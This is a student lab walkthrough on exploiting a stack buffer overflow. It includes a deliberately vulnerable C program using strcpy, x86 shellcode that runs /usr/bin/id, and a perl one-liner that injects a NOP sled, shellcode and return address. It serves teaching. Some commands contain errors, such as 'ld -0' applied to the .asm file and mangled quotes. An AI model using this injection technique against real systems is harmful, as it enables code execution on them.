---
title: CS363 Lab 2 Walkthrough
---

# CS363 Lab2 Walkthough (Fall 2016)

**By Devon Smith and Aaron Earl**

## Compiling and testing the vulnerable application


```c 
//
//  vulnerable.c
//  
//
//  Created by Yanwei Wu on 10/12/17.
//

#include <stdio.h>
#include <string.h>

void foo (char *arg) {
    char buffer[64];
    strcpy(buffer, arg);
}

int main(int argc, char *argv[]) {
    foo(argv[1]);
    return(0);
}
``` 

### Compiling the C Application

```sh
gcc -g vulnerable.c -o vulnerable.x
```
The -g option enables the debugging mode built into the gcc compiler. The -o tells 
the compiler how to name the compiled executable.

### Testing the C Application

```sh
./vulnerable.x A
```

This will not overflow the buffer and will run normally.

```sh
./vulnerable.x AAAAAAAAAAAAAAAAAA
```

This will cause a buffer overflow and segmentation fault. This can be exploited to create 
the shellcode injection attack.

## Writing Application using Intel x86 Assembly
For this project we're going to be creating an assembly application that returns the 
user ID of the current Linux shell user.

Here is the program in C

```c
#include <stdlib.h>
#include <stdio.h>

void main()
{
    system("id");
}
```

This will look like this in ASM

```asm
section .text
global _start
_start:
    ; Clear out all of the registers
    ; xoring registers with themselves nulls them out
    xor eax, eax ; technically using eax 8-bit equivalent
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    ; pushing a null character onto the stack. Since shell code
    ; will not allow the use of null characters we're pushing the value
    ; of a register that is known to contain a null value.
    push    eax
    ; here we push the command we wish to execute using execve. In this
    ; case, "/usr/bin/id". In this case the characters don't fit nicely
    ; into a register so we're going to add a slash to the string as
    ; follows:
    ; "/usr/bin//id"
    ; Remember: This is a stack so we're going to be pushing this string onto the stack in reverse.
    push    0x64692f2f ; di//
    push    0x6e692f2f ; nib/
    push    0x7273752f ; rsu/
    ; Now we move the value of the stack pointer into ebx.
    mov ebx, esp
    ; Then we place a null onto the top of the stack after the
    ; current edx stack pointer.
    push    edx
    ; No we move the current stack pointer address into ecx.
    mov ecx, esp
    ; Now we null edx
    xor edx, edx
    ; Here we move the kernel shell call for execve (11) into al.
    ; Note: al is the 8-bit version of the eax register.
    mov al, 0xb
    int 0x80
```

Another good resource for ASM tutorials can be found here: [ASM Tutor]("http://asmtutor.com/")

### Experimenting with BASH
First we're going to run the id application in BASH so we can see how it works.

```sh 
root@Hacking_Live:/# /usr/bin/id
uid=0(root) gid=0(root) groups=0(root)
```

id is the application we want to run with our shell code. To start this process we're
going to take our x86 assembly and turn it into code. To do this we take the asm above
and save it into a .asm file. Then we use nasm to compile and dump out the assembly into its
byte code.

```sh
nasm -f elf shellcode.asm
ld -0 shellcode shellcode.asm
objdump -d shellcode
```

The above shell commands will compile, load, and dump out the bytecode of the assembly. We can use the bytecode to turn into an injectable attack and run our program inside the vulnerable
c program.

## Identify the Return Address

To actually inject the shell code we need to identify the return address of the vulnerable program. You can place break points and try to identify it by overflowing, or you can use the gdb command print &ebp to get the base pointer address. You must add 4 to this to get the actual return address. In this case mine ended up being \x50\xf7\xff\xbf. This is reversed from what is printed out because Intel systems are little endian.
  

## Creating Shell Code from x86 Assembly Code

The shell code should print out as pairs of numbers. To inject it into the vulnerable program we can do this:

```sh
$(perl –e ‘ print \”x90”x25; print “\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x89\xe1\x31\xd2\xb0\x0b\xcd\x80”; print “\x50\xf7\xff\xbf”x5’)
```

The first part of this is called the NOP Sled. This pads the injection with No Ops to ensure that the buffer is overflowed and our code will be inserted. The second print will insert our program into the vulnerable program. The third print takes the return address and runs the program from there. The x5 prints the address 5 times to ensure that the system doesn't shift the addresses to compensate for oveflow. If you find your return addresses keep shifting this could be the most likely cause.

** Hope this helps **

## Resources and Notes:

Further class readings and source code can be found in my CS363 Repository.
[CS363 Repository]("https://github.com/aearl16/CS363")